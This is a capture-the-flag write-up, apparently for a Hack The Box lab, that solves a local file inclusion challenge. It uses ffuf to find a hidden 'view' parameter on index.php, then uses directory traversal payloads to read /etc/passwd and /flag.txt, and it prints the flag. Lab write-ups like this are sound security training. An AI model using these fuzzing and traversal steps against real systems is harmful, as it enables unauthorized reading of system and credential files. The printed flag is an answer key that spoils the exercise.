## Challenge

Fuzz the web application for exposed parameters, then try to exploit it with one of the LFI wordlists to read /flag.txt 

## Solutioin

In the web page there is no option like usual to change the language.

So I fuzz for common `GET` parameters on the `index.php`:

```sh
ffuf -v -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.54.208:31147/index.php?FUZZ=value' -fs 2309
```

I find one which is:

```sh
[Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 33ms]
| URL | http://94.237.54.208:31147/index.php?view=value
* FUZZ: view
```

So now let's fuzz it with a LFI wordlist:

```sh
ffuf -v -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.54.208:31147/index.php?view=FUZZ' -fs 1935
```

And this gives me a number of findings, among others this one:

```sh
[Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 31ms]
| URL | http://94.237.54.208:31147/index.php?view=../../../../../../../../../../../../../../../../../etc/passwd
* FUZZ: ../../../../../../../../../../../../../../../../../etc/passwd
```

So I use this to read the flag:

```url
http://94.237.54.208:31147/index.php?view=../../../../../../../../../../../../../../../../../flag.txt
```

and the flag is: `HTB{4u70m47!0n_f!nd5_#!dd3n_93m5}`